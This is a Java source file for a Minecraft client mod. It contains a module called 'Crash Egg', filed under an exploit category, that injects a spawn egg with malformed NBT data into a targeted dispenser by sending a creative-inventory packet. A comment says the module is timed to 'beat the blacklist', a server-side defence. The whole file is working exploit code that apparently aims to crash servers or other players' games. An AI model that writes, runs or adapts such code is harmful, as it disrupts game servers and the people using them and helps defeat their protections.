package com.housingclient.module.modules.items;

import com.housingclient.module.Category;
import com.housingclient.module.Module;
import com.housingclient.module.ModuleMode;
import com.housingclient.utils.ChatUtils;
import net.minecraft.block.Block;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.inventory.ContainerDispenser;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import net.minecraft.util.BlockPos;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.MovingObjectPosition;
import net.minecraft.util.Vec3;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;

/**
 * Crash Egg (Dispenser) Module - FAST VERSION
 * 
 * Opens dispenser FIRST, then creates egg and inserts immediately.
 * This beats the blacklist timing.
 */
public class CrashEggDispenserModule extends Module {

    private enum State {
        IDLE,
        OPEN_DISPENSER,
        WAIT_FOR_GUI,
        CREATE_AND_INSERT,
        DONE
    }

    private State currentState = State.IDLE;
    private int tickCounter = 0;
    private BlockPos targetDispenser = null;

    public CrashEggDispenserModule() {
        super("Crash Egg", "Auto-insert crash egg into dispenser (FAST)", Category.EXPLOIT,
                ModuleMode.BOTH);
    }

    @Override
    protected void onEnable() {
        if (mc.thePlayer == null || mc.theWorld == null) {
            ChatUtils.sendClientMessage("\u00A7cNot in game!");
            setEnabled(false);
            return;
        }

        MovingObjectPosition mop = mc.objectMouseOver;
        if (mop == null || mop.typeOfHit != MovingObjectPosition.MovingObjectType.BLOCK) {
            ChatUtils.sendClientMessage("\u00A7cNot looking at a block!");
            setEnabled(false);
            return;
        }

        BlockPos targetPos = mop.getBlockPos();
        Block targetBlock = mc.theWorld.getBlockState(targetPos).getBlock();

        if (targetBlock != Blocks.dispenser) {
            ChatUtils.sendClientMessage("\u00A7cNot looking at a dispenser!");
            setEnabled(false);
            return;
        }

        targetDispenser = targetPos;

        // IMMEDIATELY open dispenser on enable
        openDispenser();
        currentState = State.WAIT_FOR_GUI;
        tickCounter = 0;
    }

    private void openDispenser() {
        Vec3 hitVec = new Vec3(
                targetDispenser.getX() + 0.5,
                targetDispenser.getY() + 0.5,
                targetDispenser.getZ() + 0.5);

        mc.playerController.onPlayerRightClick(
                mc.thePlayer,
                mc.theWorld,
                mc.thePlayer.getHeldItem(),
                targetDispenser,
                EnumFacing.UP,
                hitVec);
    }

    @Override
    protected void onDisable() {
        currentState = State.IDLE;
        tickCounter = 0;
        targetDispenser = null;
    }

    @SubscribeEvent
    public void onClientTick(TickEvent.ClientTickEvent event) {
        if (event.phase != TickEvent.Phase.END)
            return;
        if (!isEnabled())
            return;
        if (mc.thePlayer == null || mc.theWorld == null)
            return;

        tickCounter++;

        switch (currentState) {
            case IDLE:
                break;
            case WAIT_FOR_GUI:
                // Check if dispenser GUI is open
                if (mc.thePlayer.openContainer instanceof ContainerDispenser) {
                    // GUI is open - now create egg and insert IMMEDIATELY
                    currentState = State.CREATE_AND_INSERT;
                } else if (tickCounter > 15) {
                    ChatUtils.sendClientMessage("\u00A7cFailed to open dispenser!");
                    setEnabled(false);
                }
                break;
            case CREATE_AND_INSERT:
                createAndInsertEgg();
                break;
            case DONE:
                ChatUtils.sendClientMessage("\u00A7aCrash egg inserted!");
                setEnabled(false);
                break;
        }

        if (tickCounter > 50) {
            ChatUtils.sendClientMessage("\u00A7cTimeout!");
            setEnabled(false);
        }
    }

    private void createAndInsertEgg() {
        if (!(mc.thePlayer.openContainer instanceof ContainerDispenser)) {
            ChatUtils.sendClientMessage("\u00A7cDispenser closed!");
            setEnabled(false);
            return;
        }

        ContainerDispenser container = (ContainerDispenser) mc.thePlayer.openContainer;

        // Find empty dispenser slot
        int emptySlot = -1;
        for (int i = 0; i < 9; i++) {
            if (container.getSlot(i).getStack() == null) {
                emptySlot = i;
                break;
            }
        }

        if (emptySlot == -1) {
            ChatUtils.sendClientMessage("\u00A7cDispenser is full!");
            setEnabled(false);
            return;
        }

        // Find empty inventory slot for the egg
        int invSlot = -1;
        for (int i = 0; i < 9; i++) {
            if (mc.thePlayer.inventory.getStackInSlot(i) == null) {
                invSlot = i;
                break;
            }
        }
        if (invSlot == -1) {
            for (int i = 9; i < 36; i++) {
                if (mc.thePlayer.inventory.getStackInSlot(i) == null) {
                    invSlot = i;
                    break;
                }
            }
        }

        if (invSlot == -1) {
            ChatUtils.sendClientMessage("\u00A7cNo empty slot!");
            setEnabled(false);
            return;
        }

        // Create the crash egg
        ItemStack crashEgg = createCrashEgg();

        // Spawn egg via creative packet
        int networkSlot = invSlot < 9 ? invSlot + 36 : invSlot;
        mc.getNetHandler().addToSendQueue(new C10PacketCreativeInventoryAction(networkSlot, crashEgg));

        // Set client-side
        mc.thePlayer.inventory.setInventorySlotContents(invSlot, crashEgg);

        // Calculate container slot for the egg
        // In dispenser container: hotbar 0-8 = slots 36-44, main inv 9-35 = slots 9-35
        int containerSlot = invSlot < 9 ? 36 + invSlot : invSlot;

        // IMMEDIATELY shift-click into dispenser
        mc.playerController.windowClick(
                container.windowId,
                containerSlot,
                0,
                1, // Shift-click
                mc.thePlayer);

        currentState = State.DONE;
    }

    /**
     * Create the crash egg with specific NBT
     */
    private ItemStack createCrashEgg() {
        ItemStack egg = new ItemStack(Items.spawn_egg, 1, 69);

        NBTTagCompound nbt = new NBTTagCompound();
        nbt.setString("ItemModel", "minecraft:water_bucket");

        NBTTagCompound display = new NBTTagCompound();
        display.setString("Name", "\u00A7fHerobrine Spawn Egg");
        nbt.setTag("display", display);

        NBTTagCompound entityTag = new NBTTagCompound();
        entityTag.setInteger("id", 69);
        nbt.setTag("EntityTag", entityTag);

        egg.setTagCompound(nbt);
        return egg;
    }

    @Override
    public String getDisplayInfo() {
        switch (currentState) {
            case WAIT_FOR_GUI:
                return "Opening...";
            case CREATE_AND_INSERT:
                return "Inserting...";
            case DONE:
                return "Done";
            default:
                return "Ready";
        }
    }
}
